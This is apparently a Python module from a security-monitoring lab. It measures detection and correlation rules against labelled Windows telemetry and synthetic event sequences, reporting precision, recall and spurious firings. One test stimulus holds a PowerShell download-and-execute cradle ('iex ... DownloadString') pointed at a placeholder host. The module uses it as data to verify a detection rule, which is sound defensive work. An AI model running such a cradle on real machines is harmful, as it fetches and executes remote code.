"""Measuring the rules against labelled telemetry.

Everywhere else in this project a rule is judged by whether it reads sensibly.
Here it is judged by whether it fires when it should and stays quiet when it
should not, against a corpus whose labels came from the run rather than from the
telemetry.

The unit of measurement is the **window**, not the event. A rule detects a
technique, and a technique happens over a period of seconds and produces dozens
of events; counting events would let one noisy technique outweigh a quiet one
and would make "recall" mean something no analyst would recognise. So each
window is scored once per rule:

* **true positive** -- the rule fired somewhere in a window labelled with a
  technique the rule names in its ATT&CK tags;
* **false positive** -- the rule fired in a window labelled with something else,
  including a benign window, or with a different technique;
* **false negative** -- a window labelled with a technique the rule names, in
  which the rule never fired;
* **true negative** -- a window labelled with something the rule does not name,
  in which it stayed quiet.

That definition is deliberately strict about what a false positive is. A rule
that fires on *any* technique is not the same as a rule that fires on the
technique it claims to detect, and scoring the first as success would flatter
every rule in the set.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

from .rules import RuleEngine, event_fields, rule_matches

__all__ = ["RuleScore", "measure_corpus", "format_scores", "load_corpus",
           "default_corpus_path", "measurement_snapshot", "measure_correlation"]


def _technique_key(tag: str) -> str:
    """The comparable form of an ATT&CK identifier.

    Rules tag themselves the way Sigma does -- ``attack.t1057`` -- and a corpus
    labels a window with the technique alone, ``T1057``. Comparing the two
    literally scored every detection as a false positive, because no rule's tags
    ever contained the label they were being measured against. The prefix and the
    case are presentation, so they are stripped here.
    """
    text = str(tag or "").strip().lower()
    # Only the Sigma namespace is stripped. Splitting on the *last* dot collapsed
    # every sub-technique to its number -- attack.t1059.001 and attack.t1003.001
    # both became "001" -- so the LSASS rule counted the encoded-PowerShell window
    # as one it names, and reported a true positive for a technique it does not
    # detect. The sub-technique is part of the identifier.
    for prefix in ("attack.", "mitre."):
        if text.startswith(prefix):
            text = text[len(prefix):]
    return text.upper()


@dataclass
class RuleScore:
    rule_id: str
    title: str
    severity: str
    techniques: tuple[str, ...]
    true_positives: int = 0
    false_positives: int = 0
    false_negatives: int = 0
    true_negatives: int = 0
    windows_matched: list[str] = field(default_factory=list)
    windows_missed: list[str] = field(default_factory=list)
    windows_false: list[str] = field(default_factory=list)
    # A rule with `alert: false` records its identity on an event so a correlation
    # can use it, and by its own declaration does not raise an alert. Scoring it
    # for precision and recall against a technique is a category error: the
    # network rule names command-and-control and fires on every outbound
    # connection, which is not a failed detection but a rule that never claimed to
    # be one. Context rules are reported separately, with their firing rate, so
    # the information stays and the label is right.
    #
    # These two sit after the counters deliberately: a dataclass is built
    # positionally in the tests, and putting them first silently shifted every
    # argument by two and made a rule with two true positives report none.
    raises_alert: bool = True
    windows_fired: int = 0
    # Whether the corpus can say anything about this rule at all. A rule naming
    # a technique nobody ran, which never fired either, has twelve true negatives
    # and they mean nothing: it was not tested, it was absent. Reporting that as
    # a clean sheet is the most misleading thing a measurement like this can do,
    # because a rule that has never been exercised looks exactly like a rule that
    # has been exercised and passed.
    tested: bool = True

    @property
    def evidence(self) -> str:
        if not self.tested:
            return "no evidence"
        return "measured"

    @property
    def precision(self) -> float | None:
        denominator = self.true_positives + self.false_positives
        return None if denominator == 0 else self.true_positives / denominator

    @property
    def recall(self) -> float | None:
        denominator = self.true_positives + self.false_negatives
        return None if denominator == 0 else self.true_positives / denominator

    @property
    def f1(self) -> float | None:
        p, r = self.precision, self.recall
        if p is None or r is None or (p + r) == 0:
            return None
        return 2 * p * r / (p + r)

    def as_dict(self) -> dict:
        def rounded(value):
            return None if value is None else round(value, 3)
        return {
            "rule_id": self.rule_id,
            "title": self.title,
            "severity": self.severity,
            "techniques": list(self.techniques),
            "tp": self.true_positives,
            "fp": self.false_positives,
            "fn": self.false_negatives,
            "tn": self.true_negatives,
            "tested": self.tested,
            "evidence": self.evidence,
            "raises_alert": self.raises_alert,
            "windows_fired": self.windows_fired,
            # a precision of 0.00 next to "no evidence" would be a different
            # claim from a precision of 0.00 next to a rule that was tested
            "precision": rounded(self.precision) if self.tested else None,
            "recall": rounded(self.recall) if self.tested else None,
            "f1": rounded(self.f1),
            "windows_matched": list(self.windows_matched),
            "windows_missed": list(self.windows_missed),
            "windows_false": list(self.windows_false),
        }


def load_corpus(path: str | Path) -> dict:
    import json
    return json.loads(Path(path).read_text(encoding="utf-8"))


def measure_corpus(corpus: dict, engine: RuleEngine | None = None) -> dict:
    """Score every rule in the engine against every window in the corpus."""
    engine = engine or RuleEngine.from_directory()

    windows = corpus["windows"]
    labels = [window["label"] for window in windows]
    scores = {
        rule.id: RuleScore(rule_id=rule.id, title=rule.title, severity=rule.level,
                           techniques=tuple(rule.techniques),
                           raises_alert=getattr(rule, "raises_alert", True))
        for rule in engine.rules
    }
    # a rule's techniques, in the same form the corpus labels windows with
    covered = {rule.id: {_technique_key(t) for t in rule.techniques} for rule in engine.rules}

    # Which rules fired anywhere in each window, evaluated once per event.
    fired: dict[str, set[str]] = {}
    for index, window in enumerate(windows):
        seen: set[str] = set()
        for event in window["events"]:
            # `rule_matches` takes the *flattened* mapping that `event_fields`
            # builds, not the payload: structured EventData is exposed both bare
            # and namespaced as `data.<Key>`, and the rules use the namespaced
            # form. Passing the payload here made every `data.` lookup resolve to
            # the empty string, so no rule could match anything -- and the two
            # rules that appeared to fire did so only because a `not` clause
            # passed on the field that was missing. The first measurement in this
            # project was wrong for that reason and the numbers were replaced.
            fields = event_fields(event)
            for rule in engine.rules:
                if rule.id in seen:
                    continue
                if rule_matches(fields, rule):
                    seen.add(rule.id)
        fired[str(index)] = seen

    # a rule starts untested and is promoted by evidence, in either direction
    for rule in engine.rules:
        scores[rule.id].tested = any(
            _technique_key(window["label"]) in covered[rule.id] for window in windows)

    for index, window in enumerate(windows):
        label = window["label"]
        for rule in engine.rules:
            score = scores[rule.id]
            named = _technique_key(label) in covered[rule.id]
            if named:
                score.tested = True      # the corpus ran something this rule names
            did_fire = rule.id in fired[str(index)]
            if did_fire:
                score.windows_fired += 1
            if not score.raises_alert:
                # counted, reported, not scored
                if named:
                    score.true_positives += 1
                continue
            if named and did_fire:
                score.true_positives += 1
                score.windows_matched.append(label)
            elif named and not did_fire:
                score.false_negatives += 1
                score.windows_missed.append(label)
            elif not named and did_fire:
                score.false_positives += 1
                score.windows_false.append(label)
                score.tested = True      # it fired, so its precision is a real number
            else:
                score.true_negatives += 1

    techniques_in_corpus = sorted({_technique_key(label) for label in labels if label != "benign"})
    return {
        "windows": len(windows),
        "benign_windows": sum(1 for label in labels if label == "benign"),
        "events": sum(len(window["events"]) for window in windows),
        "techniques_in_corpus": techniques_in_corpus,
        "blocked_techniques": corpus.get("blocked_techniques", []),
        "rules": [scores[rule.id].as_dict() for rule in engine.rules],
    }


def format_scores(result: dict) -> str:
    """A table, plus the sentence the numbers actually support."""
    lines = [
        "%-46s %-6s %4s %4s %4s %4s %9s %7s %6s" % (
            "rule", "level", "TP", "FP", "FN", "TN", "precision", "recall", "f1"),
        "-" * 108,
    ]
    for row in result["rules"]:
        if not row.get("raises_alert", True):
            continue
        def show(value):
            return "  n/a" if value is None else "%.2f" % value
        note = "" if row.get("tested", True) else "   <- no evidence"
        lines.append("%-46s %-6s %4d %4d %4d %4d %9s %7s %6s%s" % (
            row["rule_id"][:46], row["severity"][:6], row["tp"], row["fp"], row["fn"],
            row["tn"], show(row["precision"]), show(row["recall"]), show(row["f1"]), note))

    scored = [r for r in result["rules"] if r.get("raises_alert", True)]
    context = [r for r in result["rules"] if not r.get("raises_alert", True)]
    detected = [r for r in scored if r["tp"] > 0]
    untested = [r for r in scored if not r.get("tested", True)]
    lines.append("")
    if untested:
        lines.append("%d of %d rules were never exercised by this corpus. Their true "
                     "negatives are absences, not passes: the corpus ran five techniques "
                     "and these rules name none of them." % (len(untested), len(result["rules"])))
    lines.append("%d of %d rules detected anything at all in a corpus of %d windows "
                 "(%d benign, %d technique windows, %d events)."
                 % (len(detected), len(result["rules"]), result["windows"],
                    result["benign_windows"],
                    result["windows"] - result["benign_windows"], result["events"]))
    lines.append("Techniques executed: %s." % ", ".join(result["techniques_in_corpus"]))
    for blocked in result["blocked_techniques"]:
        lines.append("Not executed: %s (%s) -- %s"
                     % (blocked["attack_id"], blocked["name"], blocked["reason"]))
    if context:
        lines.append("")
        lines.append("Context rules (alert: false). These record their identity so a "
                     "correlation can use them and do not raise an alert, so they are not "
                     "scored for precision or recall -- but how often they fire is still "
                     "worth knowing, because a rule that fires in every window adds "
                     "nothing to a correlation either.")
        lines.append("")
        lines.append("%-46s %-6s %14s" % ("rule", "level", "windows it fired in"))
        lines.append("-" * 70)
        for row in context:
            lines.append("%-46s %-6s %6d of %d" % (
                row["rule_id"][:46], row["severity"][:6], row["windows_fired"], result["windows"]))
    return "\n".join(lines)


# The corpus is captured locally rather than committed -- it is real telemetry
# from a real machine, hostname and account name included -- so the path is
# configurable and the console says plainly when there is nothing to measure.
def default_corpus_path() -> Path:
    """Where the measurement reads from.

    A local capture wins, because a measurement of *this* machine is the more
    useful one and `corpus.json` is what the lab writes. The committed fixture is
    the fallback, so a fresh clone and CI can still re-derive every number in the
    README instead of taking them on trust. It is scrubbed: the machine's name,
    the account name, its SID and its real destinations are replaced.
    """
    import os
    override = os.environ.get("SIEM_LAB_CORPUS")
    if override:
        return Path(override)
    local = Path(__file__).resolve().parent.parent / "corpus.json"
    if local.exists():
        return local
    return Path(__file__).resolve().parent.parent / "tests" / "vectors" / "attack-lab-corpus.json"


_SNAPSHOT_CACHE: dict[tuple, dict] = {}


def _cache_key(path: Path, with_anomaly: bool):
    try:
        stat = path.stat()
        return (str(path), stat.st_mtime_ns, stat.st_size, with_anomaly)
    except OSError:
        return (str(path), 0, 0, with_anomaly)


def measurement_snapshot(corpus_path: str | Path | None = None,
                         engine: RuleEngine | None = None,
                         with_anomaly: bool = True,
                         use_cache: bool = True) -> dict:
    """What the console shows: the measured rates, or why there are none.

    Returning an explanation rather than an empty table is deliberate. A console
    that shows a blank measurement panel looks like a bug; one that says the
    corpus has not been captured on this host looks like what it is.
    """
    path = Path(corpus_path) if corpus_path else default_corpus_path()
    # The console asks for this on every refresh, and the answer only changes when
    # the corpus does -- but answering it means scoring every rule against every
    # window and training an isolation forest. Doing that per page refresh made
    # the endpoint the slowest thing on the dashboard. Keyed on the file's
    # modification time and size, so a new capture is picked up by itself.
    key = _cache_key(path, with_anomaly)
    if use_cache and key in _SNAPSHOT_CACHE:
        return _SNAPSHOT_CACHE[key]
    if not path.exists():
        return {
            "available": False,
            "corpus_path": str(path),
            "reason": ("no captured corpus on this host -- the measurement runs against "
                       "telemetry captured locally, and that corpus is not committed"),
            "how_to_capture": "python -m src.lab capture",
            "rules": [],
            "summary": {},
        }

    result = measure_corpus(load_corpus(path), engine)
    detected = [row for row in result["rules"] if row["tp"] > 0]
    noisy = sorted((row for row in result["rules"] if row["fp"] > 0),
                   key=lambda row: -row["fp"])
    result["available"] = True
    result["corpus_path"] = str(path)
    result["summary"] = {
        "rules": len(result["rules"]),
        "rules_that_detected_anything": len(detected),
        "rules_with_false_positives": sum(1 for row in result["rules"] if row["fp"] > 0),
        "headline": ("%d of %d rules detected anything at all in a corpus of %d windows."
                     % (len(detected), len(result["rules"]), result["windows"])),
    }
    result["noisiest"] = [{"rule_id": r["rule_id"], "false_positives": r["fp"],
                           "precision": r["precision"]} for r in noisy[:5]]

    if with_anomaly:
        try:
            from .anomaly import evaluate
            anomaly = evaluate(load_corpus(path))
            clean = anomaly["results"][0]
            result["anomaly"] = {
                "trained_on_events": anomaly["trained_on_events"],
                "features": anomaly["features"],
                "threshold": anomaly["threshold"],
                "threshold_percentile": anomaly.get("threshold_percentile"),
                "benign_flagged": clean["mean_flagged_benign"],
                "attack_flagged": clean["mean_flagged_attack"],
                "separation": clean["separation"],
                "language_model": anomaly["visibility"].get("language_model"),
                "evasions": [
                    {"name": e["name"], "forest": e["separation"],
                     "commands": (e.get("language_model") or {}).get("separation")}
                    for e in anomaly.get("evasions", [])
                ],
                "survived": anomaly["survived"],
                "attempts": anomaly["attempts"],
                "attempts_note": ("%d of %d evasion attempts left at least half the separation intact."
                                  % (anomaly["survived"], anomaly["attempts"])),
            }
        except (ValueError, ImportError) as exc:
            result["anomaly"] = {"available": False, "reason": str(exc)}
    if use_cache:
        _SNAPSHOT_CACHE[key] = result
    return result


# --- correlation -----------------------------------------------------------
#
# A correlation rule does not judge one event. It fires when two detection rules
# match *in order, on the same host or account, inside a time window* -- and the
# only way to know whether that logic works is to hand it sequences whose answer
# is known.
#
# The stimulus below is constructed rather than captured, and that is stated
# rather than glossed. The corpus contains no instance of most of these
# sequences: there has been no account created on this machine during a capture,
# no lockout, no service installed, no audit log cleared. Each stimulus is
# verified against the detection rule it claims to trip -- `rule_matches` is run
# on it before it is used -- so a scenario cannot quietly stop representing what
# it says it represents. What is measured here is the ordering, the grouping and
# the window, which is what correlation is; whether the constituent rules
# themselves fire is measured separately, on real telemetry.
_CORRELATION_STIMULUS: dict[str, dict] = {
    "win-suspicious-powershell-script-block": {
        "channel": "Microsoft-Windows-PowerShell/Operational", "event_id": "4104",
        "message": "ScriptBlock: iex (New-Object Net.WebClient).DownloadString('http://x/y')"},
    "sysmon-network-connection-to-remote-port": {
        "channel": "Microsoft-Windows-Sysmon/Operational", "event_id": "3",
        "fields": {"DestinationIp": "203.0.113.9", "DestinationPort": "443"}},
    "win-failed-logon": {"channel": "Security", "event_id": "4625"},
    "win-account-locked-out": {"channel": "Security", "event_id": "4740"},
    "win-account-created": {"channel": "Security", "event_id": "4720"},
    "win-privileged-group-local": {"channel": "Security", "event_id": "4732"},
    "win-service-installed": {"channel": "System", "event_id": "7045"},
    "win-audit-log-cleared": {"channel": "Security", "event_id": "1102"},
}

# Which grouping field each correlation rule uses, so a scenario can be built on
# the right one without reading the rule object.
_GROUP_FIELDS = {"host": "host", "username": "username"}


def _stimulus_event(rule_id: str, timestamp: str, host: str, username: str) -> dict:
    template = _CORRELATION_STIMULUS[rule_id]
    # noqa: RET504 -- named so the value reads as what it is before it is
    # returned; the assignment is documentation, not a step.
    event = {
        "rule_id": rule_id,
        "timestamp": timestamp,
        "host": host,
        "username": username,
        "channel": template.get("channel", ""),
        "event_id": template.get("event_id", ""),
        "message": template.get("message", ""),
        "fields": dict(template.get("fields") or {}),
        "id": 0,
    }
    return event


def _iso(offset_seconds: int) -> str:
    import datetime
    base = datetime.datetime(2026, 1, 1, 12, 0, 0)
    return (base + datetime.timedelta(seconds=offset_seconds)).strftime("%Y-%m-%d %H:%M:%S")


def measure_correlation(engine: RuleEngine | None = None) -> dict:
    """Score every correlation rule against sequences whose answer is known.

    Each rule gets one scenario that should fire it and three that should not:
    the same steps in the wrong order, the same steps outside the rule's own
    window, and the same steps split across two hosts or accounts. A rule that
    fires on any of the three is reporting a sequence that did not happen.
    """
    from .correlation import build_correlation_payloads

    engine = engine or RuleEngine.from_directory()
    # correlation rules live beside the detection rules, not among them
    correlation_rules = list(getattr(engine, "correlations", []) or [])
    detection = {rule.id: rule for rule in engine.rules}

    results = []
    for rule in correlation_rules:
        steps = list(rule.steps)[: max(1, int(getattr(rule, "min_steps", len(rule.steps))))]
        window = int(getattr(rule, "window_seconds", 120))
        group = str(getattr(rule, "group_by", "host"))

        # every stimulus must actually trip the rule it stands for
        unverified = [step for step in steps
                      if step not in detection
                      or not rule_matches(event_fields(_stimulus_event(step, _iso(0), "H", "U")),
                                          detection[step])]

        # The loop values are bound as defaults. These closures run inside the same
        # iteration, so closing over them is correct today -- but a closure reads the
        # variable when it runs, not when it is written, and any change to when it runs
        # would silently pair this rule's steps with the next rule's offsets.
        def scenario(offsets, hosts, steps=steps):
            return [_stimulus_event(step, _iso(offset), hosts[index], hosts[index])
                    for index, (step, offset) in enumerate(zip(steps, offsets, strict=True))]

        in_order = [index * 10 for index in range(len(steps))]
        positives = scenario(in_order, ["HOST-A"] * len(steps))
        negatives = {
            "out of order": scenario(list(reversed(in_order)), ["HOST-A"] * len(steps)),
            "outside the window": scenario([index * (window + 30) for index in range(len(steps))],
                                           ["HOST-A"] * len(steps)),
            "different groups": scenario(in_order, ["HOST-%d" % index for index in range(len(steps))]),
        }

        def fires(events, rule=rule):
            return any(payload.get("event_id") == rule.id
                       for payload in build_correlation_payloads(events, [rule]))

        fired_positive = fires(positives)
        false_scenarios = [name for name, events in negatives.items() if fires(events)]
        results.append({
            "rule_id": rule.id,
            "level": getattr(rule, "level", ""),
            "steps": steps,
            "group_by": group,
            "window_seconds": window,
            "fires_when_it_should": fired_positive,
            "fires_when_it_should_not": false_scenarios,
            "verified_stimulus": not unverified,
            "unverified_steps": unverified,
            "precision": 0.0 if false_scenarios else (1.0 if fired_positive else None),
            "recall": 1.0 if fired_positive else 0.0,
        })

    detected = [row for row in results if row["fires_when_it_should"]]
    return {
        "rules": results,
        "total": len(results),
        "fired_when_they_should": len(detected),
        "fired_when_they_should_not": sum(len(row["fires_when_it_should_not"]) for row in results),
        "unverified_stimulus": sum(1 for row in results if not row["verified_stimulus"]),
    }


def format_correlation(result: dict) -> str:
    lines = [
        "%-38s %-6s %8s %10s %9s" % ("correlation rule", "level", "fires", "spurious", "verified"),
        "-" * 78,
    ]
    for row in result["rules"]:
        lines.append("%-38s %-6s %8s %10d %9s" % (
            row["rule_id"][:38], str(row["level"])[:6],
            "yes" if row["fires_when_it_should"] else "NO",
            len(row["fires_when_it_should_not"]),
            "yes" if row["verified_stimulus"] else "NO"))
    lines.append("")
    lines.append("%d of %d correlation rules fire on the sequence they describe."
                 % (result["fired_when_they_should"], result["total"]))
    lines.append("%d spurious firings across the scenarios that should stay quiet "
                 "(wrong order, outside the window, split across groups)."
                 % result["fired_when_they_should_not"])
    if result["unverified_stimulus"]:
        lines.append("%d rules use a stimulus that does not actually trip its own "
                     "detection rule, so their scenario proves nothing."
                     % result["unverified_stimulus"])
    return "\n".join(lines)
